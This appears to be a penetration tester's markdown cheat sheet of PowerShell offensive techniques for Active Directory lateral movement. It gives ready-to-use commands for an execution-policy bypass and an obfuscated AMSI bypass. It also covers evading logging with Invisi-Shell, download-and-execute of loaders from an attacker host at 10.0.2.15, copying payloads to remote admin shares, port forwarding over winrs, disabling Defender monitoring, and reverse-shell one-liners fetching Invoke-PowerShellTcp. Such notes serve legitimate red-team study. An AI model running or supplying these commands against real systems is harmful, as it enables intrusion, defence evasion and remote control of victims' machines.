---
tags:
  - general
  - domain-enumeration
  - lateral-movement
---
##### Introduction
- Case insensitive
- .NET compliant and reliant, classes for AD are in System.DirectoryServices.ActiveDirectory
- Shell of the future, shell for the cloud
- Available not only on Windows, its called PowerShell Core.
- It is not powershell.exe, that is just a way to run System.Management.Automation.dll which is actually PowerShell.

##### Basic functionality

```powershell title:"Get the contents of a file"
gEt-COnTeNt file.txt
```

```powershell title:"help for a cmdlet"
Get-Help cmdlet-goes-here
```

```powershell title:"dot-sourcing"
. C:\AD\Tools\PowerView.ps1
```

```powershell title:"import a module or a script"
Import-Module C:\AD\Tools\ADModule-master\ActiveDirectory\ActiveDirectory.psd1
```

```powershell title:"list all the commands in a module"
Get-Command -Module <module_name>
```

##### Execution Policy

![[tweet.png]]

- It prevents users from accidentally executing scripts. Yeah.
- Here are [15 other ways to bypass it](https://www.netspi.com/blog/entryid/238/15-ways-to-bypass-the-powershell-execution-policy/)

```batch title:"bypass execution policy using batch or powershell"
1. powershell -ExecutionPolicy bypass
2. powershell -c cmd
```

```powershell title:"bypass execution policy using powershell"
$env:PSExecutionPolicyPreference="bypass"
```

##### The actual bypasses

###### Invisi-Shell

- The tool hooks the .NET assemblies (System.Management.Automation.dll and System.Core.dll) to bypass logging.
- It uses a CLR profiler API to perform the hook.

```batch title:"using invisi-shell with admin privileges"
RunWithPathAsAdmin.bat
```

```batch title:"using invisi-shell without admin privileges"
RunWithRegistryNonAdmin.bat
```

###### AMSI bypass

```powershell
S`eT-It`em ( 'V'+'aR' +  'IA' + (('b'+("{1}{0}"-f':1','lE'))+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f(('U'+'ti')+'l'),'A',('Am'+'si'),(('.'+'Man')+('ag'+'e')+('me'+'n')+'t.'),('u'+'to'+(("{1}{0}"-f 'io','mat')+'n.')),'s',(('Sys'+'t')+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+('ms'+'i')),'d',('I'+('n'+'itF')+('a'+'ile'))  ),(  "{2}{4}{0}{1}{3}" -f ('S'+('t'+'at')),'i',(('N'+'on')+('Pu'+'bl')+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
```

###### Download a file from an advanced foothold

```powershell title:"Download from webserver"
iex (iwr http://10.0.2.15/Loader.exe -UseBasicParsing)
iex ((New-Object Net.WebClient).DownloadString('http://10.0.2.15/SharpHound.ps1'))
iwr http://10.0.2.15/Safety.bat -OutFile C:\Users\Public\Argsplit.bat
```

```batch title:"Remotely copy"
echo F | xcopy C:\Users\Public\Argsplit.bat \\remote-machine\C$\Users\Public\Safety.bat
```
###### Avoid Detection

```batch title:"Portforwarding from an advanced foothold"
$null | winrs -r:remote-computer "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=10.0.2.15 connectaddress=80"
```

```batch title:'Splitting arguments'
Argsplit.bat
```

###### Disable defender

```powershell title:"Disable Real-Time monitoring (needs admin privileges)"
Set-MpPreference -DisableRealtimeMonitoring $true -Verbose
Set-MpPreference -DisableIOAVProtection $true
```

###### Reverse Shell

```batch title:"Reverse shell"
powershell iex (iwr -UseBasicParsing http://your.ip/Invoke-PowerShellTcp.ps1);Power -Reverse -IPAddress your.ip -Port your.port
powershell -c iex ((New-Object Net.WebClient).DownloadString('http://your.ip/Invoke-PowerShellTcp.ps1'));Power -Reverse -IPAddress your.ip -Port your.port
```

###### Security

```powershell title:"Check Language Mode"
$ExecutionContext.SessionState.LanguageMode
```

```powershell title:"List Applocker policy"
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```

```powershell title:"Find AV exclusion paths on the foothold (needs admin privileges)"
Get-MpPreference | select -Property ExclusionPath
```

###### List environment variables

```powershell title:":)"
ls :env
```

